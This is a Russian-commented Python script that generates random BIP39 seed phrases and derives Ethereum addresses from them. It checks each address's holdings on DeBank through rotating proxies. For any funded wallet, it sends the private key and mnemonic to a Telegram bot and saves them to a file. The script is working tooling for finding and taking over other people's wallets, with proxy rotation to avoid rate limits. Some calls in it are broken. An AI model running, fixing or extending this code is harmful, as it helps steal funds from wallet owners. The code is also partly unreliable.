import grequests
import mnemonic
import bip32utils
from bip32utils import BIP32Key
from bip32utils import BIP32_HARDEN
import blocksmith
import random
from datetime import datetime
import threading
import json
import requests
import os
import time
from Bip39Gen import Bip39Gen
from web3 import Web3
from web3 import Web3
from web3.middleware import geth_poa_middleware
from web3.providers.auto import load_provider_from_uri
from eth_account import Account


PROXY_RACK_DNS = []

binance_testnet_rpc_url = "https://eth-mainnet.public.blastapi.io" 
w3 = Web3(Web3.HTTPProvider(binance_testnet_rpc_url))
print(f"ETH genner connected: {w3.is_connected()}")  
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
w3.eth.account.enable_unaudited_hdwallet_features()

Account.enable_unaudited_hdwallet_features()



def sendBotMsg(msg, token_bot, chat_id):
    if token_bot:
        try:
            requests.post(f"https://api.telegram.org/bot{token_bot}/sendmessage?chat_id={chat_id}&text={msg}")
        except:
            print("netu tokena")


def generateSeed(wordlist):
    seed = " ".join(random.choice(wordlist) for _ in range(12))
    return seed

def get_proxies():
    print('***Проверяю наличие/добавление прокси!***' '\n')
    try:
        current_dir = os.path.abspath(os.path.dirname(__file__))
        proxy_file = os.path.join(current_dir, 'prox.txt')
        with open(proxy_file, 'r', encoding='latin1') as f:
            for line in f:
                PROXY_RACK_DNS.append(line.strip())
        print('***Прокси-файл найден и обновлен***' '\n')
        return PROXY_RACK_DNS
    except Exception as e:
        print(f'Товарищ ошибка! Не найден файл с прокси!Проверь наличие файла prox.txt {e}' '\n')
time.sleep(1)

def request_word(address,PROXY_RACK_DNS):

    urls = [
        f'https://api.debank.com/user?id={address}',
    ]

    success = False
    while not success:
        try:
            time.sleep(1)
            current_proxy = random.choice(PROXY_RACK_DNS)
            print(f"Пробую подключение прокси: {current_proxy}" '\n')
            rs = (grequests.get(u, proxies={"https": f"http://{current_proxy}"}, timeout=10) for u in urls) # type: ignore
            response = grequests.map(rs, size=5)
            if None in response:
                print(f"Запрос с {current_proxy} отклонен, меняю прокси..." '\n')
                continue
            if all(r.status_code == 200 for r in response):
                print("Запросы приняты в обработку." '\n')
                break
            for r in response:
                if r.status_code == 200:
                    try:
                        json_data = r.json()
                        if json_data:
                            print(f"Запрос удачен: Прокси: {current_proxy}")
                            break
                        else:
                            print(f"Запрос пустой: Прокси: {current_proxy}")
                            break
                    except:
                        print(f"Ошибка парсинга контента: Прокси: {current_proxy}, повторный запрос...")
                        break
                else:
                    print(f'Ошибка {r.status_code} с прокси {current_proxy}, повторный запрос...')
                    current_proxy = random.choice(PROXY_RACK_DNS)
                    break
        except StopIteration:
            msg=f'Все прокси израсходованы обнови файл прокси'
            sendBotMsg(msg)
            raise ValueError("Все прокси израсходованы обнови файл прокси")
            
    return response

def process_word(address,seed,mnemonic_words,token_bot, chat_id):
    
    def continue_search(address):
        print(f"Кошелек {address} пуст продолжаю поиск...\n")
        return True
    tir = "--------------------------------------------------------------------------------------------------------"
    end = "========================================================================================================"
    try:
        response = request_word(address, PROXY_RACK_DNS)
        res_dic = response[0].json()
        res_str = json.dumps(res_dic)
        obj = json.loads(res_str)
        debank = obj.get('data', {}).get('user', {}).get('stats', {}).get('top_coins', [])
        
        if not debank:
            if continue_search(address):
                return  
        
        with open('result_eth/eth_gen.txt', 'w') as w:
            for item in debank:
                symbol = item.get('symbol')
                usd_value = item.get('usd_value')
                symb = f'{symbol} | {usd_value}'
                if symbol and usd_value:
                    print(f"{symb}")
                    msg = f'Address: {address} | Balance coins: Symbol: {symb}| Private: {seed} | Mnemonic phrase: {mnemonic_words}\n'
                    sendBotMsg(msg,token_bot, chat_id)
                    w.write(f'Address: {address} | Balance coins: Symbol: {symb}| Private: {seed} | Mnemonic phrase: {mnemonic_words}\n')
                else:
                    print("Отсутствует 'symbol' или 'usd_value' для монеты.")
                    if continue_search(address):
                        return  
            
    except KeyError as e:
        print(f'Ошибка: {e}.')
        if continue_search():
            return  
        

def bip39(mnemonic_words):
    m = mnemonic.Mnemonic("english")
    private_key = None
    addr = None

    bip39t = m.check(mnemonic_words)
    if bip39t is True:
        account = w3.eth.account.from_mnemonic(mnemonic_words)
        addr = account.address
        private_key = account._private_key

    return private_key, addr

def generate_bip39_wallet(wordlist):
    mnemonic_words = generateSeed(wordlist)
    private_key, address = bip39(mnemonic_words)
    return private_key, address, mnemonic_words


def prv_to_addr(x):
    if x is not None:
        private_key_hex = x[0]
        address = blocksmith.EthereumWallet.checksum_address(blocksmith.EthereumWallet.generate_address(private_key_hex))
        return address
    return None

def ma_check(wordlist, token_bot, chat_id):
    msg = f' Начинаю работу с генерацией и проверкой в сетях эфировских кошельков!\n'
    sendBotMsg(msg, token_bot, chat_id)

    get_proxies()
    while True:
        mnemonic_words = generateSeed(wordlist)
        private_key, address, mnemonic_words = generate_bip39_wallet(wordlist)
        
        if private_key and address and mnemonic_words:
            print(f"Seed: {mnemonic_words} | Private Root: {private_key.hex()} | Address: {address}\n")
            with open('result_eth/eth_gen_all.txt', 'a', encoding='utf-8') as w:
                w.write(f'Seed: {mnemonic_words} | Private Root: {private_key.hex()} | Address: {address}\n')

            process_word(address, private_key, mnemonic_words, token_bot, chat_id)
        else:
            print(f'Генерирую подожди...\n')